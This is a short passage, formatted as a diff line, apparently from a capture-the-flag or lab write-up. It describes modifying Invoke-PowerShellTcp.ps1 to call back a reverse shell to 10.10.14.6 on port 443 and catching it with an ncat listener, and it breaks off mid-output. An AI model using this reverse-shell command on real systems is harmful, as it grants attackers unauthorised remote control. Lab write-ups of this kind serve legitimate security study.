@@ -1,0 +1,1 @@
+opy of Invoke-PowerShellTcp.ps1 from GitHub , and name it REV.PS1 . I’ll add a line at the end of it to call itself: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 443 Now when I run, I get a shell: oxdf@hacky$ rlwrap -cAr ncat -lvnp 443 Ncat: Version
